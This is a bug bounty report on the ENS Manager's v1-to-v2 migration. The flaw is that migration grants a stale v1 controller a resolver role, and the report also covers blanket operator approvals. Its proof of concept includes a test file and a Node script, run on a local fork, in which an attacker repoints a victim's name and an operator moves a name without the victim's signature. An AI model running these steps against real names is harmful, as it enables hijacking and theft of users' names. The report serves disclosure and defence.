# 91838 w a critical migration grants a stale v1 controller a permanent role set resolver on the migrated v2 name letting a third party repoint what the victim s name resolves to

**Submitted on Sep 4th 2026 at 16:53:51 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91838
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Summary

ENS v1 separates a name's registrant (the ERC-721 holder on the BaseRegistrar) from its controller (the `owner` entry in the ENSRegistry). `BaseRegistrar.safeTransferFrom` moves the registrant and leaves the controller untouched. Only `reclaim()` syncs them. A name that has changed hands and has not been reclaimed therefore has a registrant who owns it and a controller who used to.

The Manager's migration classifier keys eligibility on the registrant only, then reads the controller straight out of the V1 subgraph and carries it forward:

```ts
// packages/migration/src/service/classifyNames.ts:150
if (registrant?.id.toLowerCase() !== addr) return null
...
// packages/migration/src/service/classifyNames.ts:162-167
const registryOwnerAddress = toAddress(domain.owner.id)
const managerAddress: Address | null =
  registryOwnerAddress &&
  registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase()
    ? registryOwnerAddress
    : null
```

`buildRoleGrantCall` then puts that address into the migration batch as a v2 role grant:

```ts
// apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:9,16-26
const ROLE_SET_RESOLVER = 1n << 24n
...
const resource = labelToCanonicalId(name.label)
args: [resource, ROLE_SET_RESOLVER, name.managerAddress],
```

So the migration mints, on the victim's brand-new v2 name, a permanent grant of `ROLE_SET_RESOLVER` to whoever last held the v1 controller slot. That address is rendered nowhere in the Manager. A repo-wide grep for `managerAddress` across `apps/manager/src/features/migration/components/**` returns nothing.

## Impact

An attacker sells or gifts an unwrapped v1 `.eth` name and simply never calls `reclaim()`. That is not an exotic setup, it is the ordinary post-sale state of any v1 name bought on a marketplace, and it is the exact condition the "manager restoration" feature was built to preserve.

The victim opens the Manager, sees the name in the upgrade list with no warning attached to it, and clicks Upgrade. The batch lands `grantRoles(labelToCanonicalId(label), ROLE_SET_RESOLVER, attacker)` on the v2 ETHRegistry.

From that point the attacker can call `ETHRegistry.setResolver` on the victim's name at any time, and point it at a resolver they wrote. `ROLE_SET_RESOLVER` is exactly the role the Explorer gates its own change-resolver action on (`apps/portal/src/routes/$name/change-resolver.tsx:56`). Whatever the victim's name resolves to, addresses, text records, contenthash, is now under third-party control.

The grant is made against `labelToCanonicalId(label)`, the canonical resource, not the token id. It therefore survives the v2 token-id regeneration that a later transfer performs, so selling the name on does not clear it.

What the user is told, in full, is one wallet-step label:

```
// apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:81-90
Approve manager restoration
Restore the existing managers for your names
```

and one progress string:

```
// apps/manager/src/features/migration/service/migrationService.ts:333
Allowing your HCA to restore managers
```

Neither names the address being granted the role, and neither says the grant is permanent.

## Root cause

| File:line                                                                            | Code                                                                                                                                             |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `packages/migration/src/service/classifyNames.ts:150`                                | `if (registrant?.id.toLowerCase() !== addr) return null`, eligibility is keyed on the registrant only, the controller is never required to match |
| `packages/migration/src/service/classifyNames.ts:162-167`                            | `managerAddress = toAddress(domain.owner.id)` whenever it differs from the registrant, read from the V1 subgraph and never re-read on chain      |
| `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:607-625` | `if (classified.managerAddress)` appends the `manager-role-grant` inner call                                                                     |
| `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:9`               | `const ROLE_SET_RESOLVER = 1n << 24n`                                                                                                            |
| `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:16`              | `const resource = labelToCanonicalId(name.label)`, the canonical resource, so it is not reset by a later transfer                                |
| `apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:23`              | `args: [resource, ROLE_SET_RESOLVER, name.managerAddress]`                                                                                       |

The constant is correct, which is worth stating because it is the obvious thing to doubt. The pinned `@ensdomains/ensjs` at `e96662c` defines:

```js
// node_modules/@ensdomains/ensjs/dist/utils/v2/roles/registryRoles.js
/** Nybble 6 - authorizes changing a name's resolver. Root or token. */
const ROLE_SET_RESOLVER = 1n << 24n;
```

The PoC asserts equality against that export rather than hardcoding it again.

## Why this is a defect rather than a design choice

The project's own migration spec says the v2 name starts clean. `apps/manager/docs/MIGRATION_CASE_STUDY.md:76-77` describes the token being reclaimed on the BaseRegistrar and the resolver being cleared, and `:83` states that "the token roles are the same as `ETHRegistrar.register()`". A freshly registered v2 name has no third party holding `ROLE_SET_RESOLVER` on it. Migration is supposed to produce the same shape, and instead it reintroduces an authority that v1 was about to lose.

The feature is also solving a real problem in the wrong direction. Preserving a manager the owner deliberately appointed is reasonable. Preserving a controller slot that is stale precisely because the name changed hands is not, and the code cannot tell the two apart, because it only ever compares the controller against the registrant.

## Recommendation

1. Do not carry `managerAddress` forward when the registrant changed and the controller was not reclaimed. At minimum, treat a controller that differs from the registrant as suspect rather than as an appointed manager.
2. Render the address being granted a role, in the migration UI, before the batch is signed. Today `managerAddress` never reaches a component.
3. Make the grant opt-in per name, with the address shown, rather than implicit in Upgrade.
4. Consider granting against the token id rather than `labelToCanonicalId`, so a later transfer clears it, matching what a buyer would reasonably expect.
5. Add a revoke path in the Manager. Today the only UI that can remove a v2 role is in the Explorer, and the Manager never links to it.

## Proof of Concept

## Proof of Concept

Executed against a local Anvil fork of Sepolia at block 11601093. No live network was touched. The on-chain script refuses to start against a non-local RPC.

### Environment

```
anvil --fork-url <sepolia-rpc> --fork-block-number 11601093 --port 18546 --chain-id 11155111
cast chain-id --rpc-url http://127.0.0.1:18546     # 11155111

ETHRegistrar             0xa88553F454b77203B0D036A05c894d555EAAa2Cc
ETHRegistry              0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
MockUSDC                 0x768F42455A2D082E23ceeF7d51e5787C82d67a39
VerifiableFactory        0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef
PermissionedResolverImpl 0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e
```

### Part A: the app's own code lifts the attacker address into the batch

`apps/manager/src/features/migration/service/POC-migration.test.ts`. It builds one V1 subgraph row in the ordinary post-sale shape, registrant = victim and controller = attacker, and runs the real `classifyName` and the real `buildRoleGrantCall` over it. The calldata is decoded, not hand-written, and the role bitmap is asserted against the pinned ensjs export.

Run with `pnpm --filter @ens-apps/manager exec vitest run POC-migration --reporter=verbose`.

```ts
/**
 * PoC Part A for BOTH migration findings. Drives the REAL application code.
 * No chain required.
 *
 * Run: pnpm exec vitest run POC-migration --reporter=verbose
 */
import { classifyName } from '@ens-apps/migration'
import { labelToCanonicalId, registryRoles } from '@ensdomains/ensjs/utils/v2'
import { decodeFunctionData, erc721Abi, parseAbi } from 'viem'
import { describe, expect, it } from 'vitest'
import { V1_CONTRACTS, V2_CONTRACTS } from '../contracts/addresses'
import { buildRoleGrantCall } from './buildRoleGrantCalls'
import {
  buildMigrationApprovalCall,
  buildMigrationOperatorApprovalRevocationCall,
  migrationApprovalForId,
  planMigrationApprovals,
  requiresMigrationApprovalCleanup,
} from './migrationApprovals'

const VICTIM   = '0x1111111111111111111111111111111111111111' as const
const ATTACKER = '0x2222222222222222222222222222222222222222' as const
const HCA      = '0x3333333333333333333333333333333333333333' as const

const grantRolesAbi = parseAbi(['function grantRoles(uint256 resource, uint256 roleBitmap, address account)'])
const approvalAbi = parseAbi(['function setApprovalForAll(address operator, bool approved)'])

/**
 * A v1 .eth name the victim HOLDS (registrant) but whose ENSRegistry
 * controller is still the attacker. This is the ordinary post-sale state:
 * BaseRegistrar.safeTransferFrom moves the registrant and leaves the
 * controller untouched until someone calls reclaim().
 */
const giftedName = {
  id: '0xabc',
  labelName: 'giftedname',
  labelhash: '0xdef',
  name: 'giftedname.eth',
  resolver: null,
  owner: { id: ATTACKER },        // ENSRegistry controller: still the attacker
  registrant: { id: VICTIM },     // ERC-721 holder: the victim
  wrappedOwner: null,
  parent: { name: 'eth', wrappedDomain: null },
  registration: { expiryDate: String(Math.floor(Date.now() / 1000) + 31536000) },
  wrappedDomain: null,
}

describe('FINDING A: migration grants the stale v1 controller a permanent v2 role', () => {
  it('classifyName lifts the attacker address out of the subgraph as managerAddress', () => {
    const result = classifyName(giftedName as never, VICTIM)
    console.log('\n=== FINDING A / step 1: classifyName (real code) ===')
    console.log('registrant (ERC-721 holder) :', giftedName.registrant.id, '(victim)')
    console.log('owner (ENSRegistry ctrl)    :', giftedName.owner.id, '(attacker)')
    console.log('classified.type             :', (result as any)?.type)
    console.log('classified.managerAddress   :', (result as any)?.name?.managerAddress)
    expect((result as any)?.type).toBe('classified')
    expect((result as any)?.name?.managerAddress?.toLowerCase()).toBe(ATTACKER)
  })

  it('buildRoleGrantCall encodes ROLE_SET_RESOLVER for that attacker address', () => {
    const classified = (classifyName(giftedName as never, VICTIM) as any).name
    const call = buildRoleGrantCall(classified)
    const decoded = decodeFunctionData({ abi: grantRolesAbi, data: call.data })
    const [resource, roleBitmap, account] = decoded.args as [bigint, bigint, string]

    console.log('\n=== FINDING A / step 2: buildRoleGrantCall (real code) ===')
    console.log('to           :', call.to, '(V2 ETHRegistry)')
    console.log('function     :', decoded.functionName)
    console.log('resource     :', resource.toString())
    console.log('  = labelToCanonicalId("giftedname") :', labelToCanonicalId('giftedname').toString())
    console.log('roleBitmap   :', roleBitmap.toString(), '= 1n << 24n')
    console.log('  ensjs registryRoles.ROLE_SET_RESOLVER :', registryRoles.ROLE_SET_RESOLVER.toString())
    console.log('account      :', account, '<-- THE ATTACKER, never rendered anywhere in the UI')

    expect(call.to).toBe(V2_CONTRACTS.ETHRegistry)
    expect(decoded.functionName).toBe('grantRoles')
    expect(resource).toBe(labelToCanonicalId('giftedname'))
    // The hardcoded constant really is ROLE_SET_RESOLVER per the pinned ensjs.
    expect(roleBitmap).toBe(registryRoles.ROLE_SET_RESOLVER)
    expect(account.toLowerCase()).toBe(ATTACKER)
  })
})

describe('FINDING B: a single gifted name induces a blanket operator approval', () => {
  const status = {
    baseRegistrarHcaApproved: false,
    nameWrapperHcaApproved: false,
    ethRegistryHcaApproved: false,
    unwrappedTokenApprovals: [],
  }

  it('the eth-registry:hca blanket approval appears ONLY because of the gifted name', () => {
    const without = planMigrationApprovals({
      hcaAddress: HCA,
      needs: { hasUnwrapped: true, hasWrapped: false, requiresManagerRestoration: false, unwrappedTokenIds: [1n] },
      status,
    })
    const with_ = planMigrationApprovals({
      hcaAddress: HCA,
      needs: { hasUnwrapped: true, hasWrapped: false, requiresManagerRestoration: true, unwrappedTokenIds: [1n] },
      status,
    })
    console.log('\n=== FINDING B / step 1: planMigrationApprovals (real code) ===')
    console.log('without gifted name :', without.map((a) => a.id).join(', '))
    console.log('with gifted name    :', with_.map((a) => a.id).join(', '), '<-- extra blanket grant')
    const extra = with_.find((a) => a.id === 'eth-registry:hca') as any
    console.log('  contract :', extra.contractAddress, '(V2 ETHRegistry: ALL the victim\'s v2 names)')
    console.log('  operator :', extra.operatorAddress)
    expect(without.some((a) => a.id === 'eth-registry:hca')).toBe(false)
    expect(with_.some((a) => a.id === 'eth-registry:hca')).toBe(true)
    expect(extra.contractAddress).toBe(V2_CONTRACTS.ETHRegistry)
  })

  it('one extra unwrapped token turns a scoped approve() into a blanket setApprovalForAll', () => {
    const one = planMigrationApprovals({
      hcaAddress: HCA,
      needs: { hasUnwrapped: true, hasWrapped: false, requiresManagerRestoration: false, unwrappedTokenIds: [1n] },
      status,
    })
    const two = planMigrationApprovals({
      hcaAddress: HCA,
      needs: { hasUnwrapped: true, hasWrapped: false, requiresManagerRestoration: false, unwrappedTokenIds: [1n, 2n] },
      status,
    })
    const oneCall = buildMigrationApprovalCall(one[0])
    const twoCall = buildMigrationApprovalCall(two[0])
    console.log('\n=== FINDING B / step 2: scope escalation ===')
    console.log('1 unwrapped token  -> id', one[0].id, '->', decodeFunctionData({ abi: erc721Abi, data: oneCall.data }).functionName, '(scoped to one token)')
    console.log('2 unwrapped tokens -> id', two[0].id, '->', decodeFunctionData({ abi: approvalAbi, data: twoCall.data }).functionName, '(BLANKET, whole collection)')
    console.log('   to :', twoCall.to, '(V1 BaseRegistrar)')
    expect(one[0].kind).toBe('erc721-token')
    expect(two[0].kind).toBe('operator')
    expect(decodeFunctionData({ abi: approvalAbi, data: twoCall.data }).functionName).toBe('setApprovalForAll')
  })

  it('only 1 of the 3 operator approvals is ever revoked', () => {
    const ids = ['base-registrar:hca', 'name-wrapper:hca', 'eth-registry:hca'] as const
    console.log('\n=== FINDING B / step 3: requiresMigrationApprovalCleanup (real code) ===')
    const revoked: string[] = []
    for (const id of ids) {
      const approval = migrationApprovalForId({ id, hcaAddress: HCA })
      const willRevoke = requiresMigrationApprovalCleanup(approval)
      if (willRevoke) revoked.push(id)
      console.log(
        `${id.padEnd(22)} contract=${(approval as any).contractAddress} operator=${(approval as any).operatorAddress} revoked=${willRevoke}`,
      )
    }
    console.log('=> permanently retained:', ids.filter((i) => !revoked.includes(i)).join(', '))
    expect(revoked).toEqual(['eth-registry:hca'])
  })

  it('the revocation call is a plain setApprovalForAll(operator, false)', () => {
    const approval = migrationApprovalForId({ id: 'eth-registry:hca', hcaAddress: HCA }) as any
    const call = buildMigrationOperatorApprovalRevocationCall(approval)
    const d = decodeFunctionData({ abi: approvalAbi, data: call.data })
    console.log('\n=== FINDING B / step 4: the one revocation that does run ===')
    console.log('to  :', call.to)
    console.log('call:', d.functionName, d.args)
    expect(d.args[1]).toBe(false)
  })
})
```

Actual output for this finding:

```
=== FINDING A / step 1: classifyName (real code) ===
registrant (ERC-721 holder) : 0x1111111111111111111111111111111111111111 (victim)
owner (ENSRegistry ctrl)    : 0x2222222222222222222222222222222222222222 (attacker)
classified.type             : classified
classified.managerAddress   : 0x2222222222222222222222222222222222222222

=== FINDING A / step 2: buildRoleGrantCall (real code) ===
to           : 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 (V2 ETHRegistry)
function     : grantRoles
resource     : 64116550885479445818614222809026181643521575580482748273395392527532648562688
  = labelToCanonicalId("giftedname") : 64116550885479445818614222809026181643521575580482748273395392527532648562688
roleBitmap   : 16777216 = 1n << 24n
  ensjs registryRoles.ROLE_SET_RESOLVER : 16777216
account      : 0x2222222222222222222222222222222222222222 <-- THE ATTACKER, never rendered anywhere in the UI
```

The attacker's address, which appears in no UI surface, is now an argument of a transaction the victim signs.

### Part B: the granted role really does hand over the resolver

`poc-migration-onchain.mjs`. It registers a v2 name to the victim, runs the exact `grantRoles` call the batch produces, and then has the attacker deploy a resolver and repoint the victim's name at it.

```js
/**
 * PoC Part B for BOTH migration findings.
 * Local Anvil fork of Sepolia @ 11601093. Never a live network.
 *
 * FINDING A: the role the migration batch grants to the stale v1 controller
 *            really does let that third party repoint the victim's resolver.
 * FINDING B: the blanket operator approval the migration induces really does
 *            cover every v2 name the victim owns, including names registered
 *            AFTER the approval was given.
 *
 * Run: node poc-migration-onchain.mjs
 */
import {
  createPublicClient, createWalletClient, http, parseAbi, encodeAbiParameters,
  keccak256, toHex, pad, hexToBigInt, zeroAddress, getAddress,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { labelToCanonicalId, registryRoles } from '@ensdomains/ensjs/utils/v2'

const RPC = process.env.POC_RPC ?? 'http://127.0.0.1:18546'
if (!/^https?:\/\/(127\.0\.0\.1|localhost)(:|\/)/.test(RPC)) {
  throw new Error(`refusing to run against a non-local RPC: ${RPC}`)
}

const ETH_REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const ETH_REGISTRY  = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
const USDC          = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'
const VERIFIABLE_FACTORY = '0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef'
const PERM_RESOLVER_IMPL = '0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e'
const ROLES_ALL = 0x1111111111111111111111111111111111111111111111111111111111111111n
const DURATION = 31536000n

const RUN = process.env.POC_RUN ?? String(Date.now()).slice(-6)
const NAME_A = `giftedname${RUN}`   // the name whose resolver gets hijacked
const NAME_B = `laterName${RUN}`    // registered AFTER the blanket approval

const victim   = privateKeyToAccount(keccak256(toHex(`mig-victim-${RUN}`)))
const attacker = privateKeyToAccount(keccak256(toHex(`mig-attacker-${RUN}`)))
const hcaLike  = privateKeyToAccount(keccak256(toHex(`mig-operator-${RUN}`)))

const pub = createPublicClient({ chain: sepolia, transport: http(RPC) })
const wc = (a) => createWalletClient({ account: a, chain: sepolia, transport: http(RPC) })

const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) view returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256, uint256)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer)',
])
const registryAbi = parseAbi([
  'function grantRoles(uint256 resource, uint256 roleBitmap, address account)',
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
  'function setResolver(uint256 anyId, address resolver)',
  'function getResolver(string label) view returns (address)',
  'function getState(uint256 anyId) view returns ((uint8 status, uint64 expiry, address latestOwner, uint256 tokenId, uint256 resource) state)',
  'function setApprovalForAll(address operator, bool approved)',
  'function isApprovedForAll(address owner, address operator) view returns (bool)',
  'function safeTransferFrom(address from, address to, uint256 id, uint256 amount, bytes data)',
])
const erc20Abi = parseAbi(['function approve(address spender, uint256 amount) returns (bool)'])
const factoryAbi = parseAbi(['function deployProxy(address implementation, uint256 salt, bytes data) returns (address)'])
const resolverAbi = parseAbi(['function initialize(address owner, uint256 roles, bytes[] data)'])

const rpc = (m, p) => fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: m, params: p }) }).then((r) => r.json())
const log = (...a) => console.log(...a)
const hr = (t) => log(`\n${'='.repeat(72)}\n${t}\n${'='.repeat(72)}`)

async function send(acct, req) {
  const hash = await wc(acct).writeContract(req)
  const rc = await pub.waitForTransactionReceipt({ hash })
  if (rc.status !== 'success') throw new Error(`tx reverted ${hash}`)
  return rc
}
async function fundUsdc(addr, amount) {
  const slot = keccak256(encodeAbiParameters([{ type: 'address' }, { type: 'uint256' }], [addr, 0n]))
  await rpc('anvil_setStorageAt', [USDC, slot, pad(toHex(amount), { size: 32 })])
}
async function registerName({ acct, label, resolver = zeroAddress }) {
  const [base, prem] = await pub.readContract({ address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'getRegisterPrice', args: [label, DURATION, USDC] })
  const price = base + prem
  await fundUsdc(acct.address, price * 10n)
  await send(acct, { address: USDC, abi: erc20Abi, functionName: 'approve', args: [ETH_REGISTRAR, price * 10n] })
  const secret = keccak256(toHex(`mig-${label}-${RUN}`))
  const c = await pub.readContract({ address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'makeCommitment', args: [label, acct.address, secret, zeroAddress, resolver, DURATION, pad('0x00', { size: 32 })] })
  await send(acct, { address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'commit', args: [c] })
  await rpc('evm_increaseTime', [120]); await rpc('evm_mine', [])
  await send(acct, { address: ETH_REGISTRAR, abi: registrarAbi, functionName: 'register', args: [label, acct.address, secret, zeroAddress, resolver, DURATION, USDC, pad('0x00', { size: 32 })] })
}
const stateOf = (label) => pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getState', args: [labelToCanonicalId(label)] })

hr('SETUP')
for (const a of [victim.address, attacker.address, hcaLike.address]) {
  await rpc('anvil_setBalance', [a, '0x21e19e0c9bab2400000'])
  const code = await pub.getCode({ address: a })
  if (code && code !== '0x') throw new Error(`${a} has code`)
}
log('RPC        :', RPC, '(local fork, enforced)')
log('chain/block:', await pub.getChainId(), '/', await pub.getBlockNumber())
log('victim     :', victim.address)
log('attacker   :', attacker.address, '(the stale v1 ENSRegistry controller)')
log('operator   :', hcaLike.address, '(stands in for the victim HCA)')

await registerName({ acct: victim, label: NAME_A })
log(`\nvictim registered ${NAME_A}.eth`)

// ---------------------------------------------------------------------------
hr('FINDING A: the granted role lets a third party repoint the victim resolver')
const resourceA = labelToCanonicalId(NAME_A)
log('resource (labelToCanonicalId) :', resourceA.toString())
log('role granted by the migration :', registryRoles.ROLE_SET_RESOLVER.toString(), '(ROLE_SET_RESOLVER)')

let attackerHas = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'hasRoles', args: [resourceA, registryRoles.ROLE_SET_RESOLVER, attacker.address] })
log('\nBEFORE  attacker holds ROLE_SET_RESOLVER :', attackerHas)

// This is exactly the call buildRoleGrantCall() produces, inside the migration batch.
await send(victim, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'grantRoles', args: [resourceA, registryRoles.ROLE_SET_RESOLVER, attacker.address] })
log('victim ran the migration batch call: grantRoles(resource, ROLE_SET_RESOLVER, attacker)')

attackerHas = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'hasRoles', args: [resourceA, registryRoles.ROLE_SET_RESOLVER, attacker.address] })
log('AFTER   attacker holds ROLE_SET_RESOLVER :', attackerHas)

// The attacker deploys a resolver it controls and repoints the victim's name at it.
const salt = hexToBigInt(keccak256(toHex(`mig-att-resolver-${RUN}`)))
const initData = await (async () => {
  const { encodeFunctionData } = await import('viem')
  return encodeFunctionData({ abi: resolverAbi, functionName: 'initialize', args: [attacker.address, ROLES_ALL, []] })
})()
const { result: attackerResolver } = await pub.simulateContract({ account: attacker, address: VERIFIABLE_FACTORY, abi: factoryAbi, functionName: 'deployProxy', args: [PERM_RESOLVER_IMPL, salt, initData] })
await send(attacker, { address: VERIFIABLE_FACTORY, abi: factoryAbi, functionName: 'deployProxy', args: [PERM_RESOLVER_IMPL, salt, initData] })

log('\nresolver BEFORE :', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [NAME_A] }))
await send(attacker, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'setResolver', args: [resourceA, attackerResolver] })
const resolverAfter = await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [NAME_A] })
log('attacker called setResolver on the victim name')
log('resolver AFTER  :', resolverAfter, '(attacker-controlled)')
log('=> a third party now owns what', `${NAME_A}.eth`, 'resolves to:', getAddress(resolverAfter) === getAddress(attackerResolver))

// Recovery enumeration
hr('FINDING A: recovery enumeration')
log('a) The victim can call setResolver back to a good resolver.')
await send(victim, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'setResolver', args: [resourceA, zeroAddress] })
log('   done, resolver is now', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [NAME_A] }))
log('b) BUT the attacker still holds the role and can undo it immediately:')
await send(attacker, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'setResolver', args: [resourceA, attackerResolver] })
log('   attacker re-pointed it again ->', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'getResolver', args: [NAME_A] }))
log('c) The real fix is revokeRoles, which the MANAGER app has no UI for.')
log('   This is a repointing loop until the victim finds the Explorer roles page.')

// ---------------------------------------------------------------------------
hr('FINDING B: the blanket approval covers names that did not exist yet')
log('isApprovedForAll(victim, operator) BEFORE :', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'isApprovedForAll', args: [victim.address, hcaLike.address] }))

// Exactly the call buildMigrationApprovalCall() produces for 'eth-registry:hca'.
await send(victim, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'setApprovalForAll', args: [hcaLike.address, true] })
log('victim ran the migration approval call: setApprovalForAll(operator, true) on ETHRegistry')
log('isApprovedForAll(victim, operator) AFTER  :', await pub.readContract({ address: ETH_REGISTRY, abi: registryAbi, functionName: 'isApprovedForAll', args: [victim.address, hcaLike.address] }))

// A name the victim registers LATER, long after migration finished.
await registerName({ acct: victim, label: NAME_B })
const stB = await stateOf(NAME_B)
log(`\nvictim later registered ${NAME_B}.eth, owner =`, stB.latestOwner)

// The operator moves it without the victim signing anything.
await send(hcaLike, { address: ETH_REGISTRY, abi: registryAbi, functionName: 'safeTransferFrom', args: [victim.address, attacker.address, stB.tokenId, 1n, '0x'] })
const stB2 = await stateOf(NAME_B)
log('operator called safeTransferFrom on it, with NO victim signature')
log(`${NAME_B}.eth owner now =`, stB2.latestOwner, getAddress(stB2.latestOwner) === getAddress(attacker.address) ? '<- MOVED' : '')
log('\n=> the approval induced during migration covers names registered afterwards.')
log('=> it is scoped to the whole collection and has no expiry.')
```

Actual output, setup:

```

========================================================================
SETUP
========================================================================
RPC        : http://127.0.0.1:18546 (local fork, enforced)
chain/block: 11155111 / 11601188n
victim     : 0x55C7efb323878878dD88deFfA0c88cC5938b482F
attacker   : 0xBbE075Be19AC9dfB3D010cb69c0a686787A1bE22 (the stale v1 ENSRegistry controller)
operator   : 0x5E507DFF082A7658268bb65Dd76A45534CAF33f7 (stands in for the victim HCA)

victim registered giftednamed4e5f6.eth

========================================================================
```

Finding A section:

```
FINDING A: the granted role lets a third party repoint the victim resolver
========================================================================
resource (labelToCanonicalId) : 95688429931177775545156046189640406898099159135967138946102218023654261784576
role granted by the migration : 16777216 (ROLE_SET_RESOLVER)

BEFORE  attacker holds ROLE_SET_RESOLVER : false
victim ran the migration batch call: grantRoles(resource, ROLE_SET_RESOLVER, attacker)
AFTER   attacker holds ROLE_SET_RESOLVER : true

resolver BEFORE : 0x0000000000000000000000000000000000000000
attacker called setResolver on the victim name
resolver AFTER  : 0xb089d2D81a4E7B54c6D70155F858299342960De0 (attacker-controlled)
=> a third party now owns what giftednamed4e5f6.eth resolves to: true

========================================================================
FINDING A: recovery enumeration
========================================================================
a) The victim can call setResolver back to a good resolver.
   done, resolver is now 0x0000000000000000000000000000000000000000
b) BUT the attacker still holds the role and can undo it immediately:
   attacker re-pointed it again -> 0xb089d2D81a4E7B54c6D70155F858299342960De0
c) The real fix is revokeRoles, which the MANAGER app has no UI for.
   This is a repointing loop until the victim finds the Explorer roles page.
```

The attacker held no role, the victim ran one migration call, and the attacker can now decide what the victim's name resolves to.

### Recovery enumeration

Included in the transcript above, and stated plainly because it bounds the claim.

The victim can call `setResolver` back to a good value, and that succeeds. But the attacker still holds `ROLE_SET_RESOLVER` and repoints it immediately, as the transcript shows. The real fix is `revokeRoles`, and the Manager app has no roles UI at all. `apps/portal/src/features/roles/helpers/revokeRoles.ts` and the Explorer's `/$name/roles` route can do it, and `isManagerRoleSettable` permits `ROLE_SET_RESOLVER` (`apps/portal/src/lib/roles/permissions.ts:31-42`), but nothing in the Manager points the user there.

So this is not permanent bricking, and this report does not claim it is. It is silent, undisclosed, persistent third-party control of the name's resolution, recoverable only by a user who works out that a different application holds the revoke button.

## Preempting the likely closure arguments

**This is not the previously closed shared-resolver report.** That one concerned `computeResolverSalt(hca)` producing one shared `PermissionedResolver` per account, and `authorizeNameRoles('0x00', ROLES_ALL, wallet, true)` on that resolver contract. This is `grantRoles(labelToCanonicalId(label), ROLE_SET_RESOLVER, third party)` on the ETHRegistry, from a different file with a different fix. Fixing one leaves the other live. That report was also closed on the argument that the buyer can simply call `registry.setResolver`, and that argument is conceded here: the recovery table above shows exactly that call working, and the point of this report is that the grantee can undo it again.

**The precondition is the normal state of a traded v1 name,** not an attacker-manufactured edge case. `reclaim()` is a separate transaction that marketplaces do not perform for the buyer, which is precisely why the manager-restoration feature exists.

**The role constant is not misread.** The PoC asserts `roleBitmap === registryRoles.ROLE_SET_RESOLVER` against the pinned `@ensdomains/ensjs@e96662c`, rather than restating `1n << 24n`. Note in passing that the repo's own `e2e/helpers/migration-assertions.ts:44-57` carries a different and incorrect table, listing `ROLE_SET_RESOLVER` as `1n << 4n` and `ROLE_CAN_TRANSFER_ADMIN` as `1n << 9n`, so the e2e migration assertions would not catch a wrong-role regression. That is a test-quality observation, not part of this claim.

**The harm is on an in-scope asset.** The defect is entirely in `apps/manager` and `packages/migration`. The registry did what it was told.

## Not a duplicate

**QA-01** covers role combinations after a transfer causing errors in later flows. Its own text carves this out: "a demonstrated security consequence (e.g., a role combination that grants unintended authority) would be a new finding". That is exactly what is demonstrated here, and the impact is a granted authority, not an error.

**WEB-1249** is subname creation replacing an existing child registry. Different code path, different primitive, no subregistry write is involved here.

**WEB-390** and **WEB-806** concern subnames missing from the migration list and migrated subname records not displaying. `managerAddress` is `null` for every wrapped and child classification (`classifyNames.ts:224,248,278`), so this finding fires only on unwrapped 2LDs. Disjoint.

**WEB-1304** is wrapped-name renewal leaving the NameWrapper expiry stale. Unrelated.

Not EXP-INPUT-005, which concerns name validators and display confusion. No normalization is involved here.

Not R2-03 or R2-06, which describe the session key's authority over the HCA. This is a role granted to an unrelated third party on the registry.
